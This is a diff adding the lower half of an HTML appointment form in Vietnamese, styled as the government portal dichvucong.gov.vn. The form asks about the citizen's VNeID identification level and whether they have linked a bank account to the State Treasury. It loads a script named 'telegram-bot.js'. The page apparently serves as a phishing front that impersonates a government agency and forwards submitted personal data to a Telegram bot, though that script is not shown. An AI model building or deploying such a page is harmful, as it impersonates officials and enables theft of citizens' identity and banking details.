+                            <h3>📋 3. Nội dung công việc</h3>
+                        </div>
+
+                        <div class="form-group">
+                            <label for="jobType">Chọn loại công việc <span class="required">*</span></label>
+                            <select id="jobType" name="jobType" required>
+                                <option value="">-- Chọn loại công việc --</option>
+                                <optgroup label="Hộ tịch - Hành chính">
+                                    <option value="khaisinh">Đăng ký khai sinh</option>
+                                    <option value="kethon">Đăng ký kết hôn</option>
+                                    <option value="lyhon">Đăng ký ly hôn</option>
+                                    <option value="tuvong">Đăng ký tử vong</option>
+                                    <option value="tamtru">Đăng ký tạm trú/tạm vắng</option>
+                                    <option value="thanhtra">Thay đổi/sửa đổi hộ tịch</option>
+                                </optgroup>
+                                <optgroup label="Đất đai - Xây dựng">
+                                    <option value="sotdo">Cấp sổ đỏ/sổ hồng</option>
+                                    <option value="giayxaydung">Xin phép xây dựng</option>
+                                    <option value="chuyennhuong">Chuyển nhượng quyền sử dụng đất</option>
+                                    <option value="dinhdanh-muc3-tichhop">Định danh mức 3 / Tích hợp giấy chứng nhận quyền sử dụng đất</option>
+                                </optgroup>
+                                <optgroup label="Kinh doanh">
+                                    <option value="dangkykd">Đăng ký kinh doanh</option>
+                                    <option value="dangkyho">Đăng ký hộ kinh doanh</option>
+                                </optgroup>
+                                <optgroup label="Xã hội">
+                                    <option value="xahoi">Hỗ trợ xã hội, trợ cấp</option>
+                                    <option value="baohiem">Bảo hiểm y tế, xã hội</option>
+                                </optgroup>
+                                <optgroup label="Khác">
+                                    <option value="traodoi">Trao đổi, tư vấn chính sách</option>
+                                    <option value="phanani">Phản ánh, kiến nghị</option>
+                                    <option value="khac">Công việc khác</option>
+                                </optgroup>
+                            </select>
+                        </div>
+
+                        <div class="form-group">
+                            <label for="purpose">Lý do hẹn <span class="required">*</span></label>
+                            <textarea id="purpose" name="purpose" rows="4" required placeholder="Mô tả lý do bạn cần hẹn..." minlength="20" maxlength="1000"></textarea>
+                            <small>Tối thiểu 20 ký tự, tối đa 1000 ký tự</small>
+                        </div>
+
+                        <div class="form-row">
+                            <div class="form-group">
+                                <label for="participants">Số người tham gia</label>
+                                <input type="number" id="participants" name="participants" min="1" max="10" value="1">
+                                <small>Tối đa 10 người</small>
+                            </div>
+                            <div class="form-group">
+                                <label for="notes">Ghi chú</label>
+                                <textarea id="notes" name="notes" rows="3" placeholder="Thông tin bổ sung (nếu có)..." maxlength="500"></textarea>
+                                <small>Tối đa 500 ký tự</small>
+                            </div>
+                        </div>
+
+                        <!-- 4. Xác nhận thông tin -->
+                        <div class="form-section-header">
+                            <h3>✅ 4. Xác nhận thông tin</h3>
+                        </div>
+
+                        <div class="form-group">
+                            <div class="checkbox-group">
+                                <input type="checkbox" id="vnidLevel2" name="vnidLevel2" value="yes">
+                                <label for="vnidLevel2">Công dân đã thực hiện định danh điện tử mức 2 trên ứng dụng VNeID</label>
+                            </div>
+                        </div>
+
+                        <div class="form-group">
+                            <div class="checkbox-group">
+                                <input type="checkbox" id="bankSync" name="bankSync" value="yes">
+                                <label for="bankSync">Công dân đã liên kết tài khoản ngân hàng với Kho bạc Nhà nước</label>
+                            </div>
+                        </div>
+
+                        <div class="form-group">
+                            <div class="checkbox-group">
+                                <input type="checkbox" id="confirmAccuracy" name="confirmAccuracy" value="yes" required>
+                                <label for="confirmAccuracy">Tôi cam đoan thông tin trên là chính xác và chịu trách nhiệm trước pháp luật <span class="required">*</span></label>
+                            </div>
+                        </div>
+
+                        <div class="form-actions">
+                            <button type="submit" class="btn btn-primary">
+                                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="margin-right: 8px; vertical-align: middle;">
+                                    <path d="M19 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11l5 5v11a2 2 0 0 1-2 2z"></path>
+                                    <polyline points="17 21 17 13 7 13 7 21"></polyline>
+                                    <polyline points="7 3 7 8 15 8"></polyline>
+                                </svg>
+                                Đăng Ký
+                            </button>
+                            <button type="reset" class="btn btn-secondary">
+                                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="margin-right: 8px; vertical-align: middle;">
+                                    <polyline points="1 4 1 10 7 10"></polyline>
+                                    <path d="M3.51 15a11 11 0 1 0 2.13-9.36L1 10"></path>
+                                </svg>
+                                Làm Mới
+                            </button>
+                        </div>
+                    </form>
+                </div>
+
+                <div class="section-card appointments-list-card">
+                    <div class="section-card-header">
+                        <h2 class="section-card-title">
+                            <svg class="section-icon" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <line x1="8" y1="6" x2="21" y2="6"></line>
+                                <line x1="8" y1="12" x2="21" y2="12"></line>
+                                <line x1="8" y1="18" x2="21" y2="18"></line>
+                                <line x1="3" y1="6" x2="3.01" y2="6"></line>
+                                <line x1="3" y1="12" x2="3.01" y2="12"></line>
+                                <line x1="3" y1="18" x2="3.01" y2="18"></line>
+                            </svg>
+                            Danh Sách Đăng Ký
+                        </h2>
+                        <button id="clearAllBtn" class="btn btn-danger">
+                            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="margin-right: 5px; vertical-align: middle;">
+                                <polyline points="3 6 5 6 21 6"></polyline>
+                                <path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"></path>
+                            </svg>
+                            Xóa Tất Cả
+                        </button>
+                    </div>
+                    <div id="appointmentsList" class="appointments-list">
+                        <!-- Danh sách đăng ký sẽ được hiển thị ở đây -->
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="main-footer">
+        <div class="container">
+            <div class="footer-content">
+                <div class="footer-info">
+                    <p><strong>Cơ quan chủ quản:</strong> Văn phòng Chính phủ</p>
+                    <p><strong>www.dichvucong.gov.vn</strong></p>
+                    <p><strong>Tổng đài hỗ trợ:</strong> 18001096</p>
+                    <p><strong>Email:</strong> dichvucong@chinhphu.vn</p>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <div id="notification" class="notification"></div>
+
+    <script src="telegram-bot.js"></script>
+    <script src="script.js"></script>
+</body>
+</html>
